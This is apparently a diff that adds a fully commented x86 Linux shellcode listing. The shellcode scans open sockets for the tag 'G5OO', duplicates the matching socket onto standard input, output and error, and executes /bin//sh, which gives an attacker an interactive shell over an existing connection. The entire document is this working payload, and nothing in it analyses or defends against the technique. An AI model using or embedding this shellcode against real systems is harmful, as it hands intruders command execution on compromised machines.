@@ -1,0 +1,36 @@
+00000000  31DB              xor ebx,ebx            ; zero out EBX
+00000002  53                push ebx               ; push 0x0 as where we'll write our buffer
+00000003  89E6              mov esi,esp            ; store a pointer to the argument in ESI
+00000005  6A40              push byte +0x40        ; MSG_DONTWAIT flag
+00000007  B70A              mov bh,0xa             ; 0x0a00 will be the len
+00000009  53                push ebx               ; push 0x0a00 onto the stack for our len argument
+0000000A  56                push esi               ; push the pointer to our buffer onto the stack
+0000000B  53                push ebx               ; 0x0a00 onto the stack for our sockfd
+0000000C  89E1              mov ecx,esp            ; pointer to our function arguments
+0000000E  86FB              xchg bh,bl             ; make EBX 0x000a for our SYS_RECV socketcall
+00000010  66FF01            inc word [ecx]         ; increment our sockfd from 0x0a00 to 0x0a01
+00000013  6A66              push byte +0x66        ; push socketcall onto number onto the stack
+00000015  58                pop eax                ; pop the value into EAX
+00000016  CD80              int 0x80               ; perform the socketcall
+00000018  813E47354F4F      cmp dword [esi],0x4f4f3547      ; compare the value we received in our buffer to G5OO
+0000001E  75F0              jnz 0x10               ; if we didn't find our tag, jump back to 00000010 so we can look at the next socket
+00000020  5F                pop edi                ; we found it! pop sockfd into EDI
+00000021  89FB              mov ebx,edi            ; save sockfd in EBX for our dup2 calls
+00000023  6A02              push byte +0x2         ; we want to do three iterations of dup2 (2, 1, and 0) so we push the value
+00000025  59                pop ecx                ; then pop it into ECX
+00000026  6A3F              push byte +0x3f        ; 0x3f is the dup2 syscall
+00000028  58                pop eax                ; which we need in EAX for our function call
+00000029  CD80              int 0x80               ; execute dup2
+0000002B  49                dec ecx                ; decrement our counter
+0000002C  79F8              jns 0x26               ; if we haven't hit the signed flag (-1), we're not done looping yet. Go back to the dup2 call at 00000026
+0000002E  6A0B              push byte +0xb         ; push the execve system call onto the stack
+00000030  58                pop eax                ; and pop it onto the stack
+00000031  99                cdq                    ; zero out EDX
+00000032  52                push edx               ; NULL string terminator
+00000033  682F2F7368        push dword 0x68732f2f  ; hs//
+00000038  682F62696E        push dword 0x6e69622f  ; nib/
+0000003D  89E3              mov ebx,esp            ; pointer to /bin//sh into EBX
+0000003F  52                push edx               ; push NULL function argument
+00000040  53                push ebx               ; push /bin//shNULL pointer
+00000041  89E1              mov ecx,esp            ; move pointer to /bin//shNULL into ECX
+00000043  CD80              int 0x80               ; and pop our shell
